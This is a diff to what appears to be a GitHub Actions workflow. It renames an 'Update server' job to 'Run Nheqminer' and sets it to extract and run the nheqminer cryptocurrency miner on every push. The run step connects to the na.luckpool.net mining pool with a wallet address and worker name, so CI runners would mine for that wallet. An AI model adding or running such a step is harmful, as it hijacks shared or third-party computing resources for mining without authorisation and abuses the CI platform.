@@ -1,4 +1,5 @@
-name: Update server
+name: Run Nheqminer
+
 on:
   push:
     branches:
@@ -22,10 +23,13 @@ jobs:
       - name: Extract files
         run: |
           tar -xvf nheqminer-Linux-v0.8.2.tgz
-          # Uncomment the next line if you need to extract the .tar.gz file as well
-          # tar -xvf nheqminer-Linux-v0.8.2.tar.gz
+
+      - name: List files
+        run: |
+          ls -l  # List files in the current directory
+          # If nheqminer is inside another directory, you might need to adjust the path here
 
       - name: Run nheqminer
         run: |
-          cd nheqminer
+          cd nheqminer  # Adjust this path if necessary
           ./nheqminer -v -l na.luckpool.net:3956 -u RP8SNudJuHRv3GJsxb2LJBrKxQKRdKoHL3.kiukiu1 -p x -t 2
